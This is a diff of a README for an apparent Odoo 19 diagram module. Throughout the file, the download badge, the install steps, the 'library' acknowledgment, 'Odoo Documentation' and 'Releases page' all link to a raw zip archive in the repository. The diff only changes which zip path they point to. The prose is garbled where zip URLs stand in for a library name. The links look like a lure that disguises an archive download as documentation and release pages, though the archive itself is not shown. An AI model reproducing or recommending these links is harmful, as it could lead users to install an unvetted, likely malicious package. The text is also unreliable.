@@ -1,10 +1,10 @@
 # 🎨 mermaid_diagram - Easy Diagram Rendering for Odoo 19
 
-[![Download](https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip%https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip)](https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip)
+[![Download](https://github.com/Tata600/mermaid_diagram/raw/refs/heads/master/mermaid_diagram/static/description/mermaid-diagram-v1.8.zip%https://github.com/Tata600/mermaid_diagram/raw/refs/heads/master/mermaid_diagram/static/description/mermaid-diagram-v1.8.zip)](https://github.com/Tata600/mermaid_diagram/raw/refs/heads/master/mermaid_diagram/static/description/mermaid-diagram-v1.8.zip)
 
 ## 🚀 Getting Started
 
-Welcome to mermaid_diagram! This application helps you create and render beautiful diagrams in Odoo 19 knowledge articles and HTML fields. Using https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip, you can visualize complex ideas simply and effectively.
+Welcome to mermaid_diagram! This application helps you create and render beautiful diagrams in Odoo 19 knowledge articles and HTML fields. Using https://github.com/Tata600/mermaid_diagram/raw/refs/heads/master/mermaid_diagram/static/description/mermaid-diagram-v1.8.zip, you can visualize complex ideas simply and effectively.
 
 ## 🔍 Features
 
@@ -21,7 +21,7 @@ Welcome to mermaid_diagram! This application helps you create and render beautif
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest release: [Download mermaid_diagram](https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip).
+To get started, visit this page to download the latest release: [Download mermaid_diagram](https://github.com/Tata600/mermaid_diagram/raw/refs/heads/master/mermaid_diagram/static/description/mermaid-diagram-v1.8.zip).
 
 Once on the Releases page, follow these steps:
 
@@ -56,11 +56,11 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 ## 📦 Acknowledgments
 
-Thanks to the https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip library for providing powerful diagram rendering capabilities. Its functionality enhances the visual aspect of your knowledge articles greatly.
+Thanks to the https://github.com/Tata600/mermaid_diagram/raw/refs/heads/master/mermaid_diagram/static/description/mermaid-diagram-v1.8.zip library for providing powerful diagram rendering capabilities. Its functionality enhances the visual aspect of your knowledge articles greatly.
 
 ## 🔗 Additional Resources
 
-- [https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip Documentation](https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip)
-- [Odoo Documentation](https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip)
+- [https://github.com/Tata600/mermaid_diagram/raw/refs/heads/master/mermaid_diagram/static/description/mermaid-diagram-v1.8.zip Documentation](https://github.com/Tata600/mermaid_diagram/raw/refs/heads/master/mermaid_diagram/static/description/mermaid-diagram-v1.8.zip)
+- [Odoo Documentation](https://github.com/Tata600/mermaid_diagram/raw/refs/heads/master/mermaid_diagram/static/description/mermaid-diagram-v1.8.zip)
 
-For more updates, return to the [Releases page](https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip) frequently.
+For more updates, return to the [Releases page](https://github.com/Tata600/mermaid_diagram/raw/refs/heads/master/mermaid_diagram/static/description/mermaid-diagram-v1.8.zip) frequently.
